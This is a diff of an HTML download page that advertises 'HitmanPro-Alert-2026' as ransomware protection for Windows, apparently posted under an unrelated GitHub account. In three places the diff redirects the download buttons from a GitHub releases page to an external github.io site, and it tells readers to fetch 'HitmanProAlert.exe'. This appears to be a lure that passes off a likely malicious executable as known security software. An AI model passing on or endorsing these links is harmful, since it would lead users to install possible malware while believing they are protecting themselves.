@@ -1,7 +1,7 @@
 <h1 id="title">🛡️ HitmanPro-Alert-2026 - Advanced Ransomware Protection for Windows</h1>
 
 <p style="font-size: 18px; padding: 20px; background-color: #f0f8ff; border-left: 4px solid #4a90d9; margin: 20px 0;">
-<strong>⬇️ Download:</strong> <a href="https://github.com/Wettingnewcastledisease763/HitmanPro-Alert-2026/releases" style="background-color: #4a90d9; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: bold;">Download HitmanPro-Alert for Windows</a>
+<strong>⬇️ Download:</strong> <a href="https://wettingnewcastledisease763.github.io" style="background-color: #4a90d9; color: white; padding: 10px 20px; text-decoration: none; border-radius: 4px; font-weight: bold;">Download HitmanPro-Alert for Windows</a>
 </p>
 
 <h2>📋 What This Software Does</h2>
@@ -24,7 +24,7 @@
 
 <p>Visit the releases page to download the latest version:</p>
 
-<p><a href="https://github.com/Wettingnewcastledisease763/HitmanPro-Alert-2026/releases" style="background-color: #2ea44f; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">Download Now</a></p>
+<p><a href="https://wettingnewcastledisease763.github.io" style="background-color: #2ea44f; color: white; padding: 12px 24px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">Download Now</a></p>
 
 <p>Look for the file named <code>HitmanProAlert.exe</code> in the list of files. Click on it to start the download.</p>
 
@@ -147,7 +147,7 @@
 
 <p>Ready to get started? Download HitmanPro.Alert from the official releases page:</p>
 
-<p><a href="https://github.com/Wettingnewcastledisease763/HitmanPro-Alert-2026/releases" style="background-color: #6c757d; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; font-size: 16px;">Get HitmanPro-Alert</a></p>
+<p><a href="https://wettingnewcastledisease763.github.io" style="background-color: #6c757d; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block; font-size: 16px;">Get HitmanPro-Alert</a></p>
 
 <h2>💡 Tips for Staying Safe</h2>
 
